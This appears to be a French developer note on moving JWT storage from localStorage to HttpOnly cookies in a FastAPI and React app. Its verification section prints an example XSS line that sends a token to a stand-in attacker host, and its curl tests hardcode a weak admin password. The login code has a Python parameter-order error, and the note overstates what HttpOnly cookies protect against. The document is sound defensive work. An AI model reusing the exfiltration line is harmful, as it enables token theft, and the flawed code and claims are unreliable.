# Migration JWT: localStorage → HttpOnly Cookies

**Date:** 21 mai 2026  
**Status:** ✅ Backend migré, ⏳ Frontend en attente  
**Impact Sécurité:** 🛡️ Protection contre XSS (localStorage non accessible à JavaScript)

---

## ✅ Backend — COMPLÉTÉ

### Changements Implémentés

#### 1. **app/core/rate_limiter.py** (NEW)
- Créé: Centralized limiter instance pour éviter imports circulaires
- Utilisé par: `app/api/v1/auth.py` et `app/main.py`

#### 2. **app/core/dependencies.py** — Token extraction
```python
# AVANT : Lisait depuis Authorization header
def get_current_user(token: str = Depends(oauth2_scheme))

# APRÈS : Lit depuis HttpOnly cookie
def get_token_from_cookie(access_token: Optional[str] = Cookie(None)) -> Optional[str]
def get_current_user(token: Optional[str] = Depends(get_token_from_cookie))
```

#### 3. **app/api/v1/auth.py** — Endpoints

**POST /login:**
```python
@router.post("/login")
@limiter.limit("5/minute")  # ← Rate limiting ajouté
async def login(
    request: Request,  # ← Requis pour slowapi
    form_data: OAuth2PasswordRequestForm = Depends(),
    response: Response,  # ← Pour set_cookie
    db: Session = Depends(get_db)
):
    # ... validations ...
    
    # ✅ NOUVEAU: HttpOnly Cookie au lieu du token en JSON
    response.set_cookie(
        key="access_token",
        value=access_token,
        httponly=True,        # ← JavaScript ne peut pas accéder
        secure=True,          # ← HTTPS only
        samesite="strict",    # ← Protection CSRF
        max_age=1800,         # ← Expire après 30 min
        path="/api",
    )
    
    return {"message": "Login successful", "user_id": "..."}
```

**POST /logout:** (NEW)
```python
@router.post("/logout")
async def logout(response: Response):
    response.delete_cookie(key="access_token", path="/api")
    return {"message": "Logout successful"}
```

**POST /register:**
```python
@limiter.limit("10/minute")  # ← Rate limiting ajouté
```

#### 4. **app/main.py** — Rate limiter initialization
```python
from app.core.rate_limiter import limiter

app.state.limiter = limiter
limiter.init_app(app)
```

---

## ⏳ Frontend — À FAIRE (move4epilepsy-portalLocal)

### Changement 1: src/lib/apiClient.ts

**AVANT:**
```typescript
const API_BASE_URL = import.meta.env.VITE_API_BASE_URL || 'http://localhost:8000/api/v1';

export async function apiCall(endpoint: string, options: RequestInit = {}) {
  const token = localStorage.getItem('access_token');
  
  const headers = {
    'Content-Type': 'application/json',
    ...options.headers,
  };
  
  if (token) {
    headers['Authorization'] = `Bearer ${token}`;
  }
  
  return fetch(`${API_BASE_URL}${endpoint}`, {
    ...options,
    headers,
  });
}
```

**APRÈS:**
```typescript
const API_BASE_URL = import.meta.env.VITE_API_BASE_URL;

if (!API_BASE_URL) {
  throw new Error('VITE_API_BASE_URL not defined in .env');
}

export async function apiCall(endpoint: string, options: RequestInit = {}) {
  const headers = {
    'Content-Type': 'application/json',
    ...options.headers,
  };
  
  return fetch(`${API_BASE_URL}${endpoint}`, {
    ...options,
    headers,
    credentials: 'include',  // ← CLÉS: Envoie les cookies automatiquement
  });
}
```

### Changement 2: src/hooks/useAuth.ts

**AVANT:**
```typescript
const handleLogin = async (username: string, password: string) => {
  const response = await fetch(`${API_BASE_URL}/auth/login`, {
    method: 'POST',
    body: new FormData(),  // OAuth2PasswordRequestForm
  });
  
  const data = await response.json();
  localStorage.setItem('access_token', data.access_token);  // ← Stockage local
  setUser(data.user);
};

const handleLogout = () => {
  localStorage.removeItem('access_token');  // ← Suppression locale
  setUser(null);
};
```

**APRÈS:**
```typescript
const handleLogin = async (username: string, password: string) => {
  const response = await fetch(`${API_BASE_URL}/auth/login`, {
    method: 'POST',
    credentials: 'include',  // ← Cookie envoyé automatiquement
    body: new FormData(),
  });
  
  const data = await response.json();
  // ❌ PAS de localStorage.setItem()
  // Le cookie HttpOnly est géré automatiquement par le navigateur
  setUser(data.user);
};

const handleLogout = async () => {
  await fetch(`${API_BASE_URL}/auth/logout`, {
    method: 'POST',
    credentials: 'include',  // ← Cookie inclus
  });
  
  // ❌ PAS de localStorage.removeItem()
  // Le cookie est supprimé côté serveur
  setUser(null);
};
```

### Changement 3: src/pages/AuthPage.tsx

**AVANT:**
```typescript
const handleLoginClick = async (username: string, password: string) => {
  try {
    const response = await apiCall('/auth/login', {
      method: 'POST',
      body: JSON.stringify({username, password}),
    });
    
    const token = await response.json();
    // localStorage utilisé ici
    localStorage.setItem('token', token.access_token);
    navigate('/dashboard');
  } catch (error) {
    setError(error.message);
  }
};
```

**APRÈS:**
```typescript
const handleLoginClick = async (username: string, password: string) => {
  try {
    const response = await apiCall('/auth/login', {
      method: 'POST',
      body: JSON.stringify({username, password}),
    });
    
    if (response.ok) {
      navigate('/dashboard');
      // ❌ Pas de localStorage, cookie géré automatiquement
    } else {
      const error = await response.json();
      setError(error.detail || 'Login failed');
    }
  } catch (error) {
    setError(error.message);
  }
};
```

---

## 🔍 Vérification — Avant/Après

### ✅ AVANT (localStorage — Vulnérable)
```javascript
// Script malveillant peut faire :
const token = localStorage.getItem('access_token');
fetch('https://attacker.com/steal?token=' + token);  // ← ❌ Token volé !
```

### ✅ APRÈS (HttpOnly Cookie — Sécurisé)
```javascript
// Script malveillant essaie :
const token = localStorage.getItem('access_token');  // undefined
const token2 = document.cookie;  // empty (HttpOnly)
fetch('https://attacker.com/steal?token=' + token);  // ← ✅ Échoue !

// Le cookie est AUTOMATIQUEMENT envoyé avec credentials: 'include'
// L'attaquant ne peut PAS le voir ni le voler
```

---

## 📋 Checklist Frontend

- [ ] Mettre à jour `src/lib/apiClient.ts` avec `credentials: 'include'`
- [ ] Modifier `src/hooks/useAuth.ts` pour retirer `localStorage.setItem/getItem`
- [ ] Ajouter endpoint `/logout` avec POST et `credentials: 'include'`
- [ ] Tester login/logout dans les navigateurs (Chrome, Firefox, Safari)
- [ ] Vérifier que le cookie `access_token` apparaît dans DevTools
- [ ] Confirmer que `localStorage` est vide (pas de token stocké)
- [ ] Tester XSS: vérifier que `localStorage.getItem('access_token')` retourne `null`

---

## 🧪 Test Rapide

### Backend
```bash
# 1. Login
curl -c cookies.txt -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=admin123456"

# 2. Vérifier le cookie (HTTPOnly)
cat cookies.txt
# Doit contenir : access_token ... HttpOnly ...

# 3. Requête authentifiée
curl -b cookies.txt http://localhost:8000/api/v1/auth/me

# 4. Logout
curl -b cookies.txt -X POST http://localhost:8000/api/v1/auth/logout
```

### Frontend (DevTools Console)
```javascript
// Vérifier que localStorage est vide :
localStorage.getItem('access_token')  // → null ✓

// Vérifier que le cookie existe (mais inaccessible) :
document.cookie  // → empty (HttpOnly) ✓

// Faire une requête : le cookie est envoyé automatiquement
fetch('http://localhost:8000/api/v1/auth/me', {
  credentials: 'include'  // Cookie envoyé automatiquement
}).then(r => r.json()).then(console.log)
```

---

## ⚠️ Points Importants

1. **credentials: 'include'** est OBLIGATOIRE dans les requêtes pour que le cookie soit envoyé
2. **CORS**: Backend doit avoir `allow_credentials=True` (✅ déjà configuré)
3. **HTTPS en production**: `secure=True` rejette les cookies sur HTTP
4. **SameSite=Strict**: Protection contre les attaques CSRF
5. **HttpOnly**: Le navigateur envoie le cookie, JavaScript ne peut pas le voir

---

## 🔗 Ressources

- [MDN: Cookies HttpOnly](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)
- [OWASP: XSS Prevention](https://owasp.org/www-community/attacks/xss/)
- [FastAPI: Cookies](https://fastapi.tiangolo.com/advanced/security/http-basic-auth/#httponly-cookies)
